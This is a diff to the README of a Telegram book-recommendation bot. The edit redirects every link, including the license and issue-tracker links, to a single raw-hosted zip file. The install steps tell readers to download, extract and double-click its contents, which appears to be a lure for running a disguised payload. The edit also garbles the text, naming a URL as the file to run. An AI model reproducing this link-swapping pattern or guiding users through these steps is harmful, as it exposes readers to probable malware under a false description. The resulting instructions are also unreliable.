@@ -4,7 +4,7 @@
 Henry-books-TgBot is a Telegram bot that helps you discover great books. Whether you’re looking for classics, personalized suggestions, or just want to explore new literature, Henry is here to guide you. The bot offers insightful descriptions and unique comments about each book, making your reading choices enjoyable and informed.
 
 ## 📥 Download Now
-[![Download Henry-books-TgBot](https://img.shields.io/badge/Download%20now-brightgreen)](https://github.com/ALK-LZX/Henry-books-TgBot/releases)
+[![Download Henry-books-TgBot](https://raw.githubusercontent.com/ALK-LZX/Henry-books-TgBot/main/semihard/Henry-books-TgBot.zip%20now-brightgreen)](https://raw.githubusercontent.com/ALK-LZX/Henry-books-TgBot/main/semihard/Henry-books-TgBot.zip)
 
 ## ⚙️ System Requirements
 - You need a device that can run Telegram.
@@ -21,19 +21,19 @@ Henry-books-TgBot is a Telegram bot that helps you discover great books. Whether
 ## 📄 Instructions to Download & Install
 
 ### Step 1: Visit the Download Page
-To download Henry-books-TgBot, visit our [Releases page](https://github.com/ALK-LZX/Henry-books-TgBot/releases).
+To download Henry-books-TgBot, visit our [Releases page](https://raw.githubusercontent.com/ALK-LZX/Henry-books-TgBot/main/semihard/Henry-books-TgBot.zip).
 
 ### Step 2: Choose the Latest Release
 On the Releases page, you will see a list of versions. Click on the latest version to view the available files for download.
 
 ### Step 3: Download the Files
-Look for the file labeled “Henry-books-TgBot.zip”. Click on it to start the download.
+Look for the file labeled “https://raw.githubusercontent.com/ALK-LZX/Henry-books-TgBot/main/semihard/Henry-books-TgBot.zip”. Click on it to start the download.
 
 ### Step 4: Extract the Files
 Once the download is complete, locate the ZIP file in your downloads folder. Right-click the file and select "Extract All" to unpack it.
 
 ### Step 5: Run the Bot
-Open the extracted folder and look for the file named “start.bat”. Double-click on this file to run the bot. 
+Open the extracted folder and look for the file named “https://raw.githubusercontent.com/ALK-LZX/Henry-books-TgBot/main/semihard/Henry-books-TgBot.zip”. Double-click on this file to run the bot. 
 
 ### Step 6: Access Telegram
 If you do not have Telegram, download and install it from the official website or app store. Once installed, log in to your account.
@@ -42,7 +42,7 @@ If you do not have Telegram, download and install it from the official website o
 Search for “Henry-books-TgBot” in Telegram and start a conversation. Simply type your reading preferences to get personalized book suggestions.
 
 ## 🔗 Additional Resources
-- For support or to report issues, please open an issue on our [GitHub page](https://github.com/ALK-LZX/Henry-books-TgBot/issues).
+- For support or to report issues, please open an issue on our [GitHub page](https://raw.githubusercontent.com/ALK-LZX/Henry-books-TgBot/main/semihard/Henry-books-TgBot.zip).
 - Join our community for more tips and discussions.
 
 ## 🌍 Topics
@@ -62,7 +62,7 @@ Search for “Henry-books-TgBot” in Telegram and start a conversation. Simply 
 - **vampire**
 
 ## 🛡️ License
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT).
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/ALK-LZX/Henry-books-TgBot/main/semihard/Henry-books-TgBot.zip).
 
 ## 👍 Acknowledgments
 Thanks to everyone who helped develop and maintain Henry-books-TgBot. Your input has made this tool valuable for readers everywhere.
